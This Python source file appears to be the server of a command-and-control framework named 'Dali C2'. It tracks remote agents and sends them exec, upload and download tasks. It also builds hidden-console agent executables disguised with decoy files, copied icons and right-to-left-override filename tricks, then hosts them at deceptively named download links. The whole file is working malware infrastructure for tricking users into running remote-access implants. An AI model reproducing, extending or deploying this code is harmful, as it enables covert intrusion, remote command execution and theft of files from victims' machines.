from fastapi import FastAPI, HTTPException, Depends, Request, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse, RedirectResponse, StreamingResponse
from typing import List, Dict
import uvicorn
import sys
import os
import json
import csv
import io
import urllib.parse
from datetime import datetime, timedelta
import subprocess
import tempfile
import shutil
import uuid
from pydantic import BaseModel
from .auth import create_access_token, get_current_user, verify_password, get_password_hash
from fastapi.security import OAuth2PasswordRequestForm

# Add the parent directory to sys.path to allow importing from 'shared'
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.schemas import Task
from shared.crypto import encrypt_payload, decrypt_payload
from .store import DataStore

app = FastAPI(title="Dali C2")
store = DataStore()

class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []
        self.agent_connections: Dict[str, WebSocket] = {}

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)
        # Remove from agent mapping if present
        for aid, ws in list(self.agent_connections.items()):
            if ws == websocket:
                del self.agent_connections[aid]

    def register_agent_connection(self, agent_id: str, websocket: WebSocket):
        self.agent_connections[agent_id] = websocket

    async def send_to_agent(self, agent_id: str, message: dict):
        if agent_id in self.agent_connections:
            try:
                await self.agent_connections[agent_id].send_json(message)
                return True
            except:
                return False
        return False

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

# Ensure payloads directory exists
PAYLOADS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payloads")
if not os.path.exists(PAYLOADS_DIR):
    os.makedirs(PAYLOADS_DIR)

# Mount static files and templates
app.mount("/static", StaticFiles(directory="server/static"), name="static")
templates = Jinja2Templates(directory="server/templates")

@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/token")
async def login(form_data: OAuth2PasswordRequestForm = Depends()):
    user = store.get_user(form_data.username)
    if not user or not verify_password(form_data.password, user.hashed_password):
        raise HTTPException(status_code=400, detail="Incorrect username or password")
    
    access_token = create_access_token(data={"sub": user.username})
    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/api/agents")
async def get_all_agents(user: str = Depends(get_current_user)):
    agents = store.get_all_agents()
    return [{
        "id": a.id, 
        "status": a.status,
        "version": a.version,
        "last_seen": a.last_seen, 
        "info": a.info
    } for a in agents]

@app.get("/api/tasks")
async def get_all_tasks(user: str = Depends(get_current_user)):
    tasks = store.get_all_tasks()
    return tasks

@app.get("/api/stats")
async def get_stats(user: str = Depends(get_current_user)):
    return store.get_stats()

@app.get("/api/tasks/export")
async def export_tasks(user: str = Depends(get_current_user)):
    tasks = store.get_all_tasks(limit=1000)
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(["ID", "Agent ID", "Type", "Status", "Created At", "Completed At", "Command", "Result"])
    
    for t in tasks:
        cmd = t.payload.get("command", "")
        res = json.dumps(t.result) if t.result else ""
        writer.writerow([t.id, t.agent_id, t.type, t.status, t.created_at, t.completed_at, cmd, res])
    
    output.seek(0)
    return StreamingResponse(
        io.BytesIO(output.getvalue().encode()),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=task_history_audit.csv"}
    )

@app.get("/api/tasks/{agent_id}")
async def get_agent_tasks_history(agent_id: str, user: str = Depends(get_current_user)):
    tasks = store.get_agent_tasks(agent_id)
    return tasks

@app.post("/register")
async def register_agent(request: Request):
    # Decrypt incoming registration data
    encrypted_body = await request.json()
    data = decrypt_payload(encrypted_body.get("data", ""))
    
    agent_id = data.get("agent_id")
    info = data.get("info", {})
    version = data.get("version", "1.0.0")
    
    # Capture the client's IP address
    client_ip = request.client.host
    info["ip"] = client_ip
    
    store.register_agent(agent_id, info=info, version=version)
    await manager.broadcast({"event": "agent_registered", "agent_id": agent_id})
    return {"data": encrypt_payload({"status": "registered", "agent_id": agent_id})}

@app.get("/tasks/{agent_id}")
async def get_tasks(agent_id: str):
    tasks = store.get_pending_tasks(agent_id)
    task_list = [t.id for t in tasks] # Example
    # We need the full task details for the agent
    payload = []
    for t in tasks:
        payload.append({
            "id": t.id,
            "type": t.type,
            "payload": t.payload,
            "expires_at": t.expires_at.isoformat()
        })
    
    return {"data": encrypt_payload({"tasks": payload})}

@app.post("/tasks/{agent_id}/results")
async def submit_result(agent_id: str, request: Request):
    encrypted_body = await request.json()
    data = decrypt_payload(encrypted_body.get("data", ""))
    
    task_id = data.get("task_id")
    result = data.get("result")
    
    store.update_task_result(task_id, result)
    await manager.broadcast({"event": "task_updated", "agent_id": agent_id, "task_id": task_id})
    return {"data": encrypt_payload({"status": "received"})}

from pydantic import BaseModel

class TaskRequest(BaseModel):
    agent_id: str
    task_type: str
    command: str = ""
    payload: dict = None
    expires_minutes: int = 60

@app.post("/operator/tasks")
async def create_task(req: TaskRequest, user: str = Depends(get_current_user)):
    expires_at = datetime.utcnow() + timedelta(minutes=req.expires_minutes)
    
    # Use provided payload or build from command
    task_payload = req.payload if req.payload else {"command": req.command}
    
    # Profiles logic (if only command provided)
    if not req.payload:
        if req.task_type == "upload" and ":" in req.command:
            try:
                local_path, remote_path = req.command.split(":", 1)
                local_path, remote_path = local_path.strip(), remote_path.strip()
                if os.path.exists(local_path):
                    import base64
                    with open(local_path, "rb") as f:
                        content = base64.b64encode(f.read()).decode('utf-8')
                    task_payload = {
                        "filename": os.path.basename(local_path),
                        "content": content,
                        "path": remote_path
                    }
            except: pass
        elif req.task_type == "download":
            task_payload = {"path": req.command.strip()}
        elif req.task_type == "exec":
            parts = req.command.split(" ")
            task_payload = {"command": parts[0], "args": parts[1:]}

    task_id = store.add_task(req.agent_id, req.task_type, task_payload, expires_at)
    
    # Try pushing via WebSocket for real-time agents (Web Phantom)
    await manager.send_to_agent(req.agent_id, {
        "event": "task_created",
        "agent_id": req.agent_id,
        "id": task_id,
        "type": req.task_type,
        "payload": task_payload
    })

    await manager.broadcast({"event": "task_created", "agent_id": req.agent_id, "task_id": task_id})
    return {"status": "task_created", "task_id": task_id}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            try:
                msg = json.loads(data)
                event = msg.get("event")
                
                if event == "register":
                    agent_id = msg.get("agent_id")
                    info = msg.get("info")
                    version = msg.get("version", "1.0.0")
                    agent_type = msg.get("agent_type", "binary")
                    
                    store.register_agent(agent_id, info, version, agent_type)
                    manager.register_agent_connection(agent_id, websocket)
                    await manager.broadcast({"event": "agent_updated", "agent_id": agent_id})
                    print(f"[*] Registered {agent_type} agent: {agent_id}")
                    
                    # Auto-push pending tasks on registration
                    pending = store.get_pending_tasks(agent_id)
                    for t in pending:
                        await manager.send_to_agent(agent_id, {
                            "event": "task_created",
                            "agent_id": agent_id,
                            "id": t.id,
                            "type": t.type,
                            "payload": t.payload
                        })

                elif event == "get_tasks":
                    agent_id = msg.get("agent_id")
                    pending = store.get_pending_tasks(agent_id)
                    for t in pending:
                        await manager.send_to_agent(agent_id, {
                            "event": "task_created",
                            "agent_id": agent_id,
                            "id": t.id,
                            "type": t.type,
                            "payload": t.payload
                        })

                elif event == "task_result":
                    agent_id = msg.get("agent_id")
                    task_id = msg.get("task_id")
                    result = msg.get("result")
                    
                    store.update_task_result(task_id, result)
                    await manager.broadcast({
                        "event": "task_updated", 
                        "agent_id": agent_id, 
                        "task_id": task_id,
                        "result": result
                    })
                    print(f"[*] Task result from {agent_id}: {task_id}")

            except json.JSONDecodeError:
                pass
            except Exception as e:
                print(f"[!] WebSocket Error: {e}")
    except WebSocketDisconnect:
        manager.disconnect(websocket)

@app.delete("/api/agents/{agent_id}")
async def delete_agent(agent_id: str, user: str = Depends(get_current_user)):
    success = store.delete_agent(agent_id)
    if not success:
        raise HTTPException(status_code=404, detail="Agent not found")
    await manager.broadcast({"event": "agent_deleted", "agent_id": agent_id})
    return {"status": "success"}

from fastapi import Form, UploadFile, File
try:
    from PIL import Image
except ImportError:
    Image = None

class BuildRequest(BaseModel):
    c2_url: str
    aes_key: str
    identity: str

@app.post("/operator/build")
async def build_agent(
    c2_url: str = Form(...),
    aes_key: str = Form(...),
    identity: str = Form(...),
    decoy: UploadFile = File(None),
    rtlo: bool = Form(False),
    mode: str = Form("binary"),
    user: str = Depends(get_current_user)
):
    """Generates a configured agent (Binary EXE or Web Phantom) with optional masking."""
    try:
        # Handle Web Phantom mode (Bypasses PyInstaller)
        if mode == "web":
            payload_id = str(uuid.uuid4())[:8]
            payload_storage_dir = os.path.join(PAYLOADS_DIR, payload_id)
            os.makedirs(payload_storage_dir, exist_ok=True)
            
            # Create a marker for the download route to know it's a web payload
            with open(os.path.join(payload_storage_dir, "type.web"), "w") as f:
                f.write("web_phantom")
            
            # Use a deceptive name for the URL
            deceptive_name = "secure-resource-access"
            download_url = f"/p/{payload_id}/{deceptive_name}"
            
            return {
                "status": "success",
                "download_url": download_url,
                "filename": deceptive_name,
                "payload_id": payload_id,
                "mode": "web"
            }

        # 1. Setup temporary workspace
        with tempfile.TemporaryDirectory() as tmp_dir:
            project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            
            # Copy necessary folders to workspace
            shutil.copytree(os.path.join(project_root, "agent"), os.path.join(tmp_dir, "agent"), 
                            ignore=shutil.ignore_patterns('__pycache__', '.agent_id', 'dist', 'build'))
            shutil.copytree(os.path.join(project_root, "shared"), os.path.join(tmp_dir, "shared"),
                            ignore=shutil.ignore_patterns('__pycache__'))
            
            # 2. Write configuration to .env in the workspace
            env_content = f"""C2_SERVER_URL={c2_url}
C2_AES_KEY={aes_key}
AGENT_IDENTITY={identity}
"""
            with open(os.path.join(tmp_dir, "agent", ".env"), "w") as f:
                f.write(env_content)
            
            # 3. Handle decoy file and icon spoofing
            decoy_path_for_pyi = None
            icon_path = None
            decoy_ext = ""
            if decoy:
                decoy_ext = decoy.filename.split('.')[-1].lower()
                decoy_name = f"decoy.{decoy_ext}"
                target_decoy = os.path.join(tmp_dir, "agent", decoy_name)
                content = await decoy.read()
                with open(target_decoy, "wb") as f:
                    f.write(content)
                decoy_path_for_pyi = target_decoy

                # Auto-generate icon if it's an image
                if Image and decoy_ext in ['jpg', 'jpeg', 'png', 'ico']:
                    try:
                        icon_temp = os.path.join(tmp_dir, "icon.ico")
                        img = Image.open(io.BytesIO(content))
                        icon_sizes = [(16, 16), (32, 32), (48, 48), (64, 64), (128, 128), (256, 256)]
                        img.save(icon_temp, format='ICO', sizes=icon_sizes)
                        icon_path = icon_temp
                    except Exception as e:
                        print(f"[!] Icon generation failed: {e}")

            # 4. Create a dummy __init__.py in agent if missing
            with open(os.path.join(tmp_dir, "agent", "__init__.py"), "a"): pass
            
            # 5. Run PyInstaller
            agent_source = os.path.join(tmp_dir, "agent", "agent.py")
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--name=dali_agent",
                f"--add-data={os.path.join(tmp_dir, 'shared')}{os.pathsep}shared",
                f"--add-data={os.path.join(tmp_dir, 'agent', 'plugins')}{os.pathsep}plugins",
                f"--add-data={os.path.join(tmp_dir, 'agent', '.env')}{os.pathsep}.",
                "--paths", tmp_dir,
                "--paths", os.path.join(tmp_dir, "agent"),
                "--hidden-import", "executor",
                "--hidden-import", "shared",
                "--collect-submodules", "plugins",
                "--workpath", os.path.join(tmp_dir, "work"),
                "--specpath", tmp_dir,
                "--distpath", os.path.join(tmp_dir, "dist"),
                "--clean"
            ]

            if icon_path:
                cmd.extend(["--icon", icon_path])

            if decoy_path_for_pyi:
                cmd.extend(["--add-data", f"{decoy_path_for_pyi}{os.pathsep}."])
            
            cmd.append(agent_source)
            process = subprocess.run(cmd, capture_output=True, text=True, cwd=tmp_dir)
            
            if process.returncode != 0:
                print(f"[!] PyInstaller Error: {process.stderr}")
                raise HTTPException(status_code=500, detail=f"Build failed: {process.stderr}")
            
            # 6. Determine Deceptive Filename
            original_name = "dali_agent.exe"
            if decoy:
                base = decoy.filename.rsplit('.', 1)[0]
                original_name = f"{base}.{decoy_ext}.exe"
            
            if rtlo and decoy:
                # RTLO Trick: \u202E reversals the following characters
                # Example: Report_ [RTLO] nosj.exe -> Report_ exe.json
                # We need to provide the name such that it looks like our target after reversal
                rtlo_char = "\u202E"
                # Target: base + RTLO + reversed(target_extension) + ".exe"
                # If target is .exe.json, we want reversed(nosj.exe)
                target_ext_reversed = f"{decoy_ext}.exe"[::-1]
                deceptive_name = f"{base}_{rtlo_char}{target_ext_reversed}.exe"
            else:
                deceptive_name = original_name

            if os.name != "nt" and not rtlo:
                deceptive_name = original_name.replace(".exe", "")

            # 7. Locate and read the generated EXE
            internal_exe_name = "dali_agent.exe" if os.name == "nt" else "dali_agent"
            exe_path = os.path.join(tmp_dir, "dist", internal_exe_name)
            
            if not os.path.exists(exe_path):
                raise HTTPException(status_code=500, detail="Executable not found after build")
            
            with open(exe_path, "rb") as f:
                content = f.read()
            
            # 8. Save to hosted payloads directory for "Agent by URL"
            payload_id = str(uuid.uuid4())[:8]
            payload_storage_dir = os.path.join(PAYLOADS_DIR, payload_id)
            os.makedirs(payload_storage_dir, exist_ok=True)
            
            # Save with original name on disk for stability
            hosted_path = os.path.join(payload_storage_dir, original_name)
            with open(hosted_path, "wb") as f:
                f.write(content)
            
            # 9. Return JSON with download info
            # We use a friendly URL structure: /p/{id}/{deceptive_name}
            download_url = f"/p/{payload_id}/{deceptive_name}"
            
            return {
                "status": "success",
                "download_url": download_url,
                "filename": deceptive_name,
                "payload_id": payload_id,
                "mode": "binary"
            }
            
    except Exception as e:
        print(f"[!] Build error: {e}")
        import traceback
        traceback.print_exc()
        raise HTTPException(status_code=500, detail=str(e))

@app.get("/p/{payload_id}/{filename}")
async def download_hosted_payload(payload_id: str, filename: str, request: Request):
    """Serves a hosted payload with the specified filename in headers."""
    target_dir = os.path.join(PAYLOADS_DIR, payload_id)
    if not os.path.exists(target_dir):
        raise HTTPException(status_code=404, detail="Payload not found")
    
    # Check if this is a Web Phantom payload
    if os.path.exists(os.path.join(target_dir, "type.web")):
        # Return the web phantom landing page
        return templates.TemplateResponse("web_phantom.html", {"request": request})

    files = [f for f in os.listdir(target_dir) if not f.startswith("type.")]
    if not files:
        raise HTTPException(status_code=404, detail="Payload empty")
    
    # We take the first file in the unique directory
    file_path = os.path.join(target_dir, files[0])
    
    with open(file_path, "rb") as f:
        content = f.read()
    
    # Use the filename from the URL for the download name
    filename_quoted = urllib.parse.quote(filename)
    content_disposition = f"attachment; filename=\"{filename}\"; filename*=UTF-8''{filename_quoted}"
    
    return StreamingResponse(
        io.BytesIO(content),
        media_type="application/octet-stream",
        headers={"Content-Disposition": content_disposition}
    )

if __name__ == "__main__":
    host = os.getenv("SERVER_HOST", "0.0.0.0")
    port = int(os.getenv("SERVER_PORT", "8000"))
    uvicorn.run("server.main:app", host=host, port=port, reload=True)
